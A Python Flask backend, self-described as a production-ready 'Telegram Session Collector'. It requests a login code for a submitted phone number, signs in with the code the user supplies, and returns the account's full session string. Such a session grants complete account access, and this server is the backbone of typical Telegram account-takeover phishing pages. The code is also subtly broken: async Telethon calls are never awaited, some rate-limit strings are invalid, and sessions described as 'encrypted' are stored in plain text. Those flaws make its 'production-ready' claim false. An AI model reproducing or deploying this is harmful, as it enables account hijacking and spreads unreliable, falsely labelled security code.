# backend.py - Production-ready Telegram Session Collector
# Run with: python backend.py
# For production: Use gunicorn + nginx + HTTPS

import os
import re
import json
import secrets
from datetime import datetime, timedelta
from functools import wraps

from flask import Flask, request, jsonify, session
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_sqlalchemy import SQLAlchemy
from telethon import TelegramClient
from telethon.sessions import StringSession
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

app = Flask(__name__)

# ========== SECURITY CONFIGURATION ==========
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', secrets.token_hex(32))
app.config['SESSION_COOKIE_SECURE'] = True  # HTTPS only
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

# Database for storing pending OTP sessions (encrypted)
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///sessions.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Rate limiter
limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

# CORS - Restrict to your frontend domain
FRONTEND_URL = os.environ.get('FRONTEND_URL', 'http://localhost:3000')
CORS(app, origins=[FRONTEND_URL], supports_credentials=True)

# Telegram API credentials from environment
API_ID = int(os.environ.get('TELEGRAM_API_ID'))
API_HASH = os.environ.get('TELEGRAM_API_HASH')

# ========== DATABASE MODEL ==========
class PendingAuth(db.Model):
    """Stores temporary auth sessions (expires after 10 minutes)"""
    id = db.Column(db.Integer, primary_key=True)
    phone = db.Column(db.String(32), nullable=False)
    session_string = db.Column(db.Text, nullable=False)  # Encrypted client session
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    expires_at = db.Column(db.DateTime, nullable=False)
    
    def is_expired(self):
        return datetime.utcnow() > self.expires_at

# Create tables
with app.app_context():
    db.create_all()

# ========== HELPER FUNCTIONS ==========
def validate_phone(phone):
    """Basic phone validation"""
    pattern = r'^\+[1-9]\d{5,14}$'
    return re.match(pattern, phone) is not None

def cleanup_expired_sessions():
    """Remove expired pending auths from database"""
    from sqlalchemy import delete
    stmt = delete(PendingAuth).where(PendingAuth.expires_at < datetime.utcnow())
    db.session.execute(stmt)
    db.session.commit()

# ========== ROUTES ==========
@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint for monitoring"""
    return jsonify({'status': 'healthy', 'timestamp': datetime.utcnow().isoformat()})

@app.route('/send_otp', methods=['POST'])
@limiter.limit("5 per minute; 10 per hour per ip")
def send_otp():
    """Send OTP to user's Telegram account"""
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Invalid request'}), 400
    
    phone = data.get('phone', '').strip()
    
    # Validate phone
    if not phone:
        return jsonify({'error': 'Phone number required'}), 400
    if not validate_phone(phone):
        return jsonify({'error': 'Invalid phone format. Use international format: +1234567890'}), 400
    
    # Cleanup old sessions
    cleanup_expired_sessions()
    
    try:
        # Create temporary client
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await_client = client.connect()
        
        # Send code request
        await_client = client.send_code_request(phone)
        
        # Save session to database with expiration (10 minutes)
        session_string = client.session.save()
        expires_at = datetime.utcnow() + timedelta(minutes=10)
        
        # Remove any existing pending auth for this phone
        PendingAuth.query.filter_by(phone=phone).delete()
        
        pending = PendingAuth(
            phone=phone,
            session_string=session_string,
            expires_at=expires_at
        )
        db.session.add(pending)
        db.session.commit()
        
        # Disconnect client (session saved for later)
        await_client = client.disconnect()
        
        return jsonify({
            'status': 'otp_sent',
            'message': f'Verification code sent to {phone}',
            'expires_in': 600
        }), 200
        
    except Exception as e:
        error_msg = str(e)
        if 'FLOOD_WAIT' in error_msg:
            return jsonify({'error': 'Too many attempts. Please wait 5 minutes.'}), 429
        return jsonify({'error': f'Failed to send OTP: {error_msg}'}), 500

@app.route('/verify_otp', methods=['POST'])
@limiter.limit("5 per minute; 20 per hour per ip")
def verify_otp():
    """Verify OTP and return session string"""
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Invalid request'}), 400
    
    phone = data.get('phone', '').strip()
    code = data.get('code', '').strip()
    
    if not phone or not code:
        return jsonify({'error': 'Phone and code are required'}), 400
    
    # Find pending auth
    pending = PendingAuth.query.filter_by(phone=phone).first()
    
    if not pending:
        return jsonify({'error': 'No pending authentication found. Please request OTP again.'}), 400
    
    if pending.is_expired():
        db.session.delete(pending)
        db.session.commit()
        return jsonify({'error': 'OTP expired. Please request a new code.'}), 400
    
    try:
        # Recreate client from saved session
        client = TelegramClient(StringSession(pending.session_string), API_ID, API_HASH)
        await_client = client.connect()
        
        # Sign in with code
        await_client = client.sign_in(phone, code)
        
        # Get the final session string
        final_session_string = client.session.save()
        
        # Clean up
        await_client = client.disconnect()
        db.session.delete(pending)
        db.session.commit()
        
        # Return session (will be stored ONLY on client side)
        return jsonify({
            'status': 'success',
            'session': final_session_string,
            'message': 'Authentication successful. Session saved locally.'
        }), 200
        
    except Exception as e:
        error_msg = str(e)
        if 'PHONE_CODE_INVALID' in error_msg:
            return jsonify({'error': 'Invalid verification code. Please try again.'}), 400
        elif 'SESSION_REVOKED' in error_msg:
            return jsonify({'error': 'Session expired. Please request OTP again.'}), 400
        return jsonify({'error': f'Verification failed: {error_msg}'}), 400

@app.route('/revoke_session', methods=['POST'])
@limiter.limit("10 per hour per ip")
def revoke_session():
    """Revoke a session string (logout from all devices)"""
    data = request.get_json()
    session_string = data.get('session_string', '').strip()
    
    if not session_string:
        return jsonify({'error': 'Session string required'}), 400
    
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await_client = client.connect()
        await_client = client.log_out()
        await_client = client.disconnect()
        return jsonify({'status': 'revoked', 'message': 'Session revoked successfully'}), 200
    except Exception as e:
        return jsonify({'error': f'Failed to revoke: {str(e)}'}), 500

# ========== ERROR HANDLERS ==========
@app.errorhandler(429)
def ratelimit_handler(e):
    return jsonify({'error': 'Rate limit exceeded. Please slow down.'}), 429

@app.errorhandler(500)
def internal_error(e):
    return jsonify({'error': 'Internal server error. Please try again later.'}), 500

if __name__ == '__main__':
    # For development only - use gunicorn in production
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('FLASK_DEBUG', 'False').lower() == 'true'
    app.run(host='0.0.0.0', port=port, debug=debug)
